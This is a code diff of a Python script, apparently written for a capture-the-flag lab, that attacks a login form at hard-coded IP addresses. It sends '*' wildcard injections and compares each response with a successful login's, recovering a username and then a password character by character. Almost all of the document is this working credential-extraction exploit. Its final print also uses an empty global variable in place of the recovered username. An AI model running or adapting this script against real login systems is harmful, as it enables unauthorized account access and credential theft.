@@ -3,65 +3,86 @@ from urllib.request import Request
 from urllib.request import urlopen
 import os 
 
-#url = "http://167.71.143.20:32106/login"
-#url = "http://167.71.143.20:30728/login"
-url = "http://188.166.168.204:30373/login"
+global url
+global request_successfully
 
 
 
-# to check if the login is correct
+url = "http://167.71.143.20:30583/login"
 
 request_successfully = requests.post(url, data = 
-        {
-            'username': '*',
-            'password': '*'
-        })
+    {
+        'username': '*',
+        'password': '*'
+    })
 
-print(request_successfully.url, request_successfully.status_code)
 payload_username = ''
 payload_password = ''
 
 
-for i in range(32, 126):
+def discover_user(payload_username):
 
-    username = payload_username + chr(i)+''
-    new_request = requests.post(url, data = {'username':username , 'password':'*' }).text
-
-    if new_request == request_successfully.text : 
-        pass
-    else:
-        pass
-
-
-
-
-
-"""
-#x = ''
-def authentication(url):
-    x = ''
     for i in range(32, 126):
+        
+        if chr(i) != "*":
+            username = payload_username +chr(i) + '*'
+            new_request = requests.post(url, data = {'username':username , 'password':'*' }).text
 
-        initial_payload = x+chr(i)+'*'
-        request_session = requests.session()
-        #password = initial_payload+payload+"*"
-        params = {
-                'username': '*',
-                'password':'*'
-
-                }
-        get_url = request_session.post(url, data= params)
-
-        if get_url.status_code == 200:
-            #os.system("clear")
-            print("decode: ",x, chr(i))
-            x += chr(i)
-            print(get_url.status_code)
-            #exit()
+            if new_request == request_successfully.text:
+                payload_username += chr(i)
+                discover_user(payload_username)
+                exit()
+            else:
+                continue
+        else:
+            continue
     
-    #print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))
-
+    #print(payload_username)
+    discover_password(payload_password, payload_username)
     
-#authentication(url, "")    
-"""    
+
+
+
+def discover_password(payload_password, username):
+
+
+    for x in range(32,126):
+
+        if chr(x) != "*": 
+            
+            password = payload_password + chr(x) + '*'
+            new_request = requests.post(url, data = {'username': username, 'password': password}).text
+
+            if new_request == request_successfully.text:
+                payload_password += chr(x)
+                discover_password(payload_password, username)
+                exit()
+            else:
+                continue
+
+        else:
+            continue
+
+
+    print(payload_username, payload_password)
+discover_user(payload_username)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
